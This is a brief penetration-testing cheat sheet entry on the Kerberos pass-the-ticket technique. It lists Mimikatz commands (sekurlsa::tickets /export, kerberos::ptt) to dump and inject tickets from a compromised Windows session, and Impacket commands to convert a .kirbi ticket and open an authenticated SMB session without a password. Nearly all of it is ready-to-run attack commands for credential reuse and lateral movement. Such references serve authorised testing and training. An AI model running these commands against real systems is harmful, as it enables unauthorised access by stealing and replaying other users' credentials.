Reuse an existing Kerberos ticket rather than supplying a password or hash.

**When to use:** You discover a valid Kerberos ticket in a compromised Windows session or receive a ticket file.

### **Windows — Mimikatz**

```
# View tickets in accessible logon sessions
sekurlsa::tickets

# Export tickets
sekurlsa::tickets /export

# Inject a ticket
kerberos::ptt ticket.kirbi

# View current tickets
kerberos::list
```

### **Kali — Impacket**

If you have a `.kirbi` ticket:

```
# Convert ticket format
impacket-ticketConverter ticket.kirbi ticket.ccache

# Set ticket
export KRB5CCNAME=ticket.ccache

# Authenticate using Kerberos
impacket-smbclient -k -no-pass \
domain.local/user@server.domain.local
```